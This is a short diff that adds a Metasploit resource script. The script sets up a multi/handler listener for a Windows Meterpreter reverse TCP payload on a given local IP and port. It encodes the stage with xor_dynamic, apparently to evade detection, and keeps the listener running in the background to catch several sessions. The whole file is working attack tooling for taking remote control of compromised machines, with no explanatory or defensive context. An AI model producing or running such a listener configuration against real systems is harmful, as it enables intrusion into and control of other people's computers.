@@ -1,0 +1,9 @@
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1006
+set LHOST 192.168.12.193
+set EnableStageEncoding true
+set StageEncoder x86/xor_dynamic
+set ExitOnSession false
+exploit -j -z
